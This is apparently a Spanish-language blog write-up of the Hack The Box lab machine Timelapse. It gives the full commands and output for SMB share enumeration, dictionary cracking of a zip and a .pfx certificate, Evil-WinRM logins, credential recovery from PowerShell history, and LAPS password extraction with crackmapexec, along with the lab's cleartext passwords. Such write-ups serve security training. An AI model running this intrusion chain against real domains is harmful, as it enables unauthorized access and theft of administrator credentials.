---
layout: post
title:  "Maquina Timelapse | HTB Write-Up"
description: Empezaremos con el Write-Up de la maquina de HackTheBox llamada Timelapse.
tags: HTB, Facil, Windows
---

# Timelapse ~ Hack The Box

Machine IP: 10.10.11.152

## Reconocimiento

Comienzo el reconocimiento de puertos y versiones:

```bash
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-10-27 00:33:41Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2023-10-27T00:35:13+00:00; +7h59m59s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49696/tcp open  msrpc             Microsoft Windows RPC
```

Enseguida realizo un reconocimiento al servicio SMB utilizando SMBMAP:

```bash
smbmap -H 10.10.11.152 -u 'null'
```

```bash
[+] IP: 10.10.11.152:445	Name: timelapse.htb       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Shares                                            	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
```

Me conecto al directorio **Shares** con **smbclient**:

```bash
smbclient //10.10.11.152/Shares -N
```

Encuentro dos directorios:

```bash
  Dev                                 D        0  Mon Oct 25 16:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 12:48:42 2021
```

## Explotación de vulnerabilidades

Dentro del directorio **Dev** se encuentra un Zip que descargo en mi maquina local, el Zip requiere una password para ser extraido. Asi que con **fcrackzip** le realizo un ataque de fuerza bruta para intentar descifrar la password:

```bash
❯ fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
found file 'legacyy_dev_auth.pfx', (size cp/uc   2405/  2555, flags 9, chk 72aa)
checking pw udehss                                  

PASSWORD FOUND!!!!: pw == supremelegacy
```

Al extraer el Zip se encuentra un archivo **.pfx** el cual tambien requiere una password para ser utilizado.

Para descifrar la password tambien utilizare un ataque por fuerza bruta, en este caso utilizando [crackpkcs12](https://github.com/crackpkcs12/crackpkcs12).

```bash
❯ crackpkcs12 -d /usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx

Dictionary attack - Starting 12 threads

*********************************************************
Dictionary attack - Thread 10 - Password found: thuglegacy
*********************************************************
```

Ahora procedo a generar una clave privada (.pem) con el .PFX:

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -out priv-key.pem -nodes
```

Y tambien un certificado:

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem
```

Ahora utilizando Evil-WinRM nos conectamos utilizando los .pem:

```bash
❯ evil-winrm -i 10.10.11.152 -c certificate.pem -k priv-key.pem -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```


> Importante destacar que en el comando de Evil-WinRM se utiliza la flag **-S** indicado que es SSL, ya que nos estamos conectando al puerto 5986 que es el que requiere SSL, si no ponemos esta flag, nos concetara al 5985 que es sin SSL. Y en este caso no funcionaria.

Y solo queda buscar la User-Flag antes de escalar privilegios:

```bash
*Evil-WinRM* PS C:\Users\legacyy\Desktop> dir


    Directory: C:\Users\legacyy\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/26/2023   5:32 PM             34 user.txt


*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
6f72b366************************
```
## Escalada de privilegios

Para la escalada de privilegios lo primero que hice fue revisar el historial de la PowerShell:

```bash
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\Co
nsoleHost_history.txt
```

Y enseguida encontre lo que parecen ser credenciales para **svc_deploy**:

```bash
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

Ahora simplemente utilizando Evil-WinRM me conecto como el usuario **svc_deploy**:

```bash
evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

Estando conectado como **svc_deploy** realizo un `net user` para revisar permisos:

```python
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 12:25:53 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

Enseguida me llama la atencion el de **LAPS_Readers**, leyendo en Google, LAPS **permite administrar la contraseña del Administrador Local.**

Asi que busco alguna manera de aprovecharme de este privilegio.

Finalmente leyendo en [Hacktricks](https://book.hacktricks.xyz/v/es/windows-hardening/active-directory-methodology/laps)opto por utilizar crackmapexec para extraer la contraseña. Esto se realiza desde la terminal de Linux, ya que acá simplemente utilizaremos las credenciales que ya obtuvimos de **svc_deploy**

```bash
❯ crackmapexec ldap 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' --kdcHost 10.10.11.152 -M laps
SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.152    389    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV 
LAPS        10.10.11.152    389    DC01             [*] Getting LAPS Passwords
LAPS        10.10.11.152    389    DC01             Computer: DC01$                Password: 8hQ]W)p5@MeKIl.IHjuD%tAu
```

Una vez obtenida me vuelvo a conectar con Evil-WinRM utilizando el usuario Administrator:

```bash
❯ evil-winrm -i 10.10.11.152 -u 'Administrator' -p '8hQ]W)p5@MeKIl.IHjuD%tAu' -S
```

**ROOT SHELL OBTENIDA**

Ahora solo queda ir por la flag:
```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd C:\Users\TRX\Desktop
*Evil-WinRM* PS C:\Users\TRX\Desktop> dir


    Directory: C:\Users\TRX\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/26/2023   5:32 PM             34 root.txt


*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
8c3739d6********************
```
Con esto la maquina queda finalizada.

Happy Hacking!!


